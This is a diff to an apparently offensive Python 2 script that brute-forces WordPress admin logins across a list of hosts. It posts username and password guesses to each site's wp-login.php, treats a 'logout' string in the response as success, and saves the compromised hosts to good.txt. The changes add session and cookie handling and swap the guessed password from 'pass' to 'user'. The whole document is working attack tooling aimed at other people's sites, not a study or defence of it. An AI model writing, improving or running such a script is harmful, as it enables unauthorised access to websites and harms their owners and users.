@@ -27,20 +27,22 @@ file.close()
 def brut(host, login, pwd):
     url = 'http://'+host+'/wp-login.php'
     try:
-        response_get = requests.get(url)
+        s = requests.Session()
+        response_get = s.get(url, headers=headers)
+        print s.cookies
     except Exception:
         print 'Host have error'
-    payload = {'log': login, 'pwd': pwd, 'wp-submit': 'Log In', 'redirect_to': 'http://'+host+'/wp-admin/', 'testcookie': '1'}
+    payload = {'log':login, 'pwd':pwd, 'wp-submit': 'Log+In', 'redirect_to': 'http://'+host+'/wp-admin/', 'testcookie': '1'}
+    #payload = {'log':login, 'pwd':pwd}
     print url
-    print login+'--'+pwd
+    print payload
     try:
         response = requests.post(url, data=payload, headers=headers, timeout = 10)
-        print x.requests.headers['Cookie']
-        #print response.text
     except Exception:
         return False
         print 'Find ERROR'
-    if response.text.find('action=logout')>0:
+    response_get = requests.get('http://'+host+'/wp-admin')
+    if response.text.find('logout')>0:
         return True
     else:
         return False
@@ -68,7 +70,7 @@ for i in range(len(d_list)):
     for i in range(len(l_list)):
         login = l_list[i].strip()    
         try:
-            if brut(url, login, 'pass'):
+            if brut(url, login, 'user'):
                 open('good.txt', 'a+').write(url + '\n')
                 print '1'
             else:
